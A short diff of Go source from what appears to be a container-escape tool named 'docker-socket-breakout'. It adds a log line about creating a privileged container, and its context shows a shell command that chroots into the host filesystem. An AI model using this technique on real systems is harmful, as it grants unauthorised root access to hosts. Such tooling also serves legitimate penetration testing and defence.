@@ -189,6 +189,7 @@ func launchWithClient(parent context.Context, options normalizedOptions, client 
 	if err := client.verifyImageTools(ctx, options, options.runID+"-"+probeContainerTag); err != nil {
 		return err
 	}
+	fmt.Fprintf(options.Stderr, "[docker-socket-breakout] Creating a privileged container from %s...\n", options.Image)
 
 	tty := terminal.isTerminal(options.Stdin)
 	shellCommand := "exec chroot /host /bin/sh"
